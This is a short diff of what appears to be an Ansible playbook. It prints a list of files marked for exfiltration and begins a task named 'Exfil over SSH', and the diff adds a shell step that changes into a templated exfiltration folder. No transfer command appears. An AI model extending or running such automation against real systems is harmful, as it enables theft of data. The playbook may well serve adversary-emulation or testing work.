@@ -27,3 +27,5 @@
         msg="{{ exfil_files_list.stdout_lines }}"
     - name: Exfil over SSH
       tags: always
+      shell: |
+        cd {{ exfiltration_folder }}
